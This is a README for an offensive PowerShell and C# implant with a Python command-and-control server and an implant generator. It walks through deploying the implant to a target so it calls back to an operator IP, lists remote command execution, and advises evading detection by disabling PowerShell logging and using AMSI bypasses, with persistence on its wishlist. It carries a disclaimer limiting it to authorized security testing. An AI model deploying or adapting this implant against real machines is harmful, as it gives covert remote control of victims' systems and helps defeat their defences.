# Stage 0 PowerShell Implant

A lightweight, OPSEC-focused PowerShell implant with encrypted command and control communication.
NOTE: AES keys are hardcoded. That's a signature!!! Not ready for your cool ass red team engagements. 
## Features

- **Encrypted Communication**: AES-256-CBC encryption for all C2 traffic
- **Session Management**: Multi-session support with easy switching
- **PowerShell Integration**: Native PowerShell command execution
- **OPSEC-Safe**: In-memory execution, minimal process creation
- **Simple Interface**: Clean operator interface without complex prefixes

## Components

### Server (`server.py`)
- Python-based C2 server with encrypted communication
- Multi-session management
- Interactive operator interface
- Session logging to `stage0_logs/` directory

### Implant (`implant.ps1`)
- PowerShell-based implant
- AES-256-CBC encrypted communication
- In-memory command execution
- Automatic reconnection handling

## Setup

### Prerequisites
```bash
pip install pycryptodome prompt_toolkit
```

### Server Setup
```bash
python3 server.py <listen_ip> <port>
```

Example:
```bash
python3 server.py 0.0.0.0 4343
```

### Implant Deployment
1. Modify the server IP and port in `implant.ps1`:
   ```powershell
   param(
       [string]$server = "YOUR_SERVER_IP",
       [int]$port = 4343
   )
   ```

2. Deploy to target system and execute:
   ```powershell
   .\implant.ps1
   ```

## Usage

### Operator Commands

| Command | Description |
|---------|-------------|
| `help` | Show help message |
| `sessions` | List active sessions |
| `use <session_id>` | Switch to a specific session |
| `kill <session_id>` | Forcibly close a session |
| `exit` | Exit current session (sends EXIT to implant) |

### Remote Commands

| Command Type | Example | Description |
|--------------|---------|-------------|
| **PowerShell** | `Get-Process` | Execute PowerShell commands (default) |
| **PowerShell** | `ps` | Process listing (PowerShell alias) |
| **PowerShell** | `ls` | Directory listing (PowerShell alias) |
| **OPSEC-Safe** | `whoami` | Get current user (environment variables) |
| **OPSEC-Safe** | `hostname` | Get hostname (environment variables) |
| **Windows CMD** | `CMD whoami` | Execute Windows command prompt commands |

### Examples

```bash
[OPERATOR] >>> sessions
Active sessions:
  1: 192.168.1.100:12345 [active] <-- selected

[OPERATOR] >>> ps
Handles NPM(K)  PM(K)  WS(K)   CPU(s)    Id SI ProcessName
------- ------  -----  -----   ------    -- -- -----------
    325     20   7284  39620     1.61  2976  1 explorer
    150      8   1452   7312     0.00  2604  0 powershell

[OPERATOR] >>> ls
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        1/1/2024   9:00:00 AM                Documents
-a----        1/1/2024   9:30:00 AM           1234 file.txt

[OPERATOR] >>> whoami
DOMAIN\username

[OPERATOR] >>> CMD ipconfig
Windows IP Configuration
Ethernet adapter Ethernet:
   Connection-specific DNS Suffix  . : local
   IPv4 Address. . . . . . . . . . . : 192.168.1.100
```

## OPSEC Considerations

### Strengths
- **In-memory execution**: Most commands run in PowerShell memory space
- **No process creation**: Commands don't spawn new processes (except CMD)
- **Encrypted communication**: All traffic is AES-256-CBC encrypted
- **Session persistence**: Maintains connection across command execution

### Detection Vectors
- **PowerShell logging**: Commands may be logged by ScriptBlock logging
- **AMSI scanning**: Commands are scanned by Anti-Malware Scan Interface
- **Network traffic**: Encrypted but detectable as unusual traffic
- **Process behavior**: PowerShell process with network activity

### Mitigation Strategies
- **Disable PowerShell logging** in target environment
- **Use CMD prefix** for commands that need to avoid PowerShell logging
- **Implement AMSI bypasses** for sensitive operations
- **Use environment variables** instead of `whoami` for user info

## Implant Generator

The project includes a generator script that can create implants in PowerShell and C# with customizable encryption keys and server settings.

> **Note:** All generated implants and their config files are now placed in the `implants/` directory.

### Supported Languages
- **PowerShell** (`.ps1`) - Full-featured implant with OPSEC-safe commands
- **C#** (`.cs`) - Compiled .NET implant

### Usage

```bash
# Generate PowerShell implant with random keys (output in implants/)
python3 generator.py powershell --server 192.168.1.100 --port 4343

# Generate C# implant with custom keys (output in implants/)
python3 generator.py csharp --server 192.168.1.100 --port 4343 --key 43c1ed161272e682fb0022a6be82997b --iv a14fefa11652f54a05d97e22b4759517

# Generate both PowerShell and C# implants with the same keys (output in implants/)
python3 generator.py all --server 192.168.1.100 --port 4343

# Load configuration from file
python3 generator.py powershell --config my_config.json

# Generate without updating server.py
python3 generator.py powershell --server 192.168.1.100 --port 4343 --no-update-server
```

### Configuration File Format
```json
{
  "server": "192.168.1.100",
  "port": 4343,
  "key": "43c1ed161272e682fb0022a6be82997b",
  "iv": "a14fefa11652f54a05d97e22b4759517"
}
```

### Server Integration
By default, the generator automatically updates `server.py` with the new encryption keys to ensure compatibility. Use `--no-update-server` to disable this behavior.

## File Structure

```
stage0/
├── server.py              # C2 server
├── generator.py           # Implant generator (PowerShell & C#)
├── implants/              # All generated implants and configs
├── stage0_logs/           # Session logs
├── __pycache__/           # Python cache
└── README.md              # This file
```

## Features
- Encrypted C2 communication (AES-256-CBC)
- PowerShell and C# implant generation
- OPSEC-safe `whoami` and `hostname` commands
- In-memory command execution (PowerShell)
- Session management (list, switch, kill, log)
- Clean operator interface
- Configurable keys and server settings

## OPSEC Considerations
- Hardcoded keys are a signature; not suitable for real red team engagements
- PowerShell logging, AMSI, and network traffic are detection vectors
- No process creation except for `CMD` commands
- OPSEC-safe user and host info via environment variables

## Security Notes
- Do not use hardcoded keys in real operations
- Consider implementing key management and logging bypasses for advanced OPSEC

## Troubleshooting
- If you see `[!] Failed to decode/decrypt incoming data` on the server, ensure the implant and server are using the same keys and protocol
- Only PowerShell and C# implants are supported

## Wishlist
- [ ] Advanced OPSEC features (AMSI bypass, logging bypass)
- [ ] File transfer support
- [ ] Persistence options
- [ ] More implant languages (if needed)

## License

This project is for educational and authorized security testing purposes only. Use responsibly and in accordance with applicable laws and regulations.
